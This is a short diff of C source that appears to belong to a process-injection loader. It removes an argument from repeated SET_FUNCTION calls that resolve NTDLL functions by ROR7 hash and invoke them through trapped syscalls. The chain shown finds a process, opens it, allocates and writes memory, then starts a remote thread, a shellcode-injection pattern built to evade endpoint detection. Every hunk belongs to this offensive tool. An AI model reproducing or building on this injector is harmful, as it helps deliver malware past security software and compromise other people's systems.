@@ -100,8 +100,7 @@ HANDLE GET_PROCESS_ID(WCHAR* PROCESS_NAME) {
 
         SET_FUNCTION(
                 ROR7_32__NTDLL,
-                ROR7_32__NtQuerySystemInformation,
-                &ENTRY
+                ROR7_32__NtQuerySystemInformation
         );
         TRAP_SYSCALL(
                 GetRandom(),
@@ -122,8 +121,7 @@ HANDLE GET_PROCESS_ID(WCHAR* PROCESS_NAME) {
 
         SET_FUNCTION(
                 ROR7_32__NTDLL,
-                ROR7_32__NtQuerySystemInformation,
-                &ENTRY
+                ROR7_32__NtQuerySystemInformation
         );
         TRAP_SYSCALL(
                 GetRandom(),
@@ -196,8 +194,7 @@ VOID main() {
 
         SET_FUNCTION(
                 ROR7_32__NTDLL,
-                ROR7_32__NtOpenProcess,
-                &ENTRY
+                ROR7_32__NtOpenProcess
         );
         TRAP_SYSCALL(
                 NULL,
@@ -231,8 +228,7 @@ VOID main() {
         // 
         SET_FUNCTION(
                 ROR7_32__NTDLL,
-                ROR7_32__NtAllocateVirtualMemory,
-                &ENTRY
+                ROR7_32__NtAllocateVirtualMemory
         );
         TRAP_SYSCALL(
                 NtCurrentProcess(),
@@ -263,8 +259,7 @@ VOID main() {
         // 
         SET_FUNCTION(
                 ROR7_32__NTDLL,
-                ROR7_32__NtWriteVirtualMemory,
-                &ENTRY
+                ROR7_32__NtWriteVirtualMemory
         );
         TRAP_SYSCALL(
                 NtCurrentProcess(),
@@ -299,8 +294,7 @@ VOID main() {
         // 
         SET_FUNCTION(
                 ROR7_32__NTDLL,
-                ROR7_32__NtCreateThreadEx,
-                &ENTRY
+                ROR7_32__NtCreateThreadEx
         );
         TRAP_SYSCALL(
                 NULL,
@@ -344,8 +338,7 @@ END:
         // 
         SET_FUNCTION(
                 ROR7_32__NTDLL,
-                ROR7_32__NtExitProcess,
-                &ENTRY
+                ROR7_32__NtExitProcess
         );
         TRAP_SYSCALL(
                 NtCurrentProcess(),
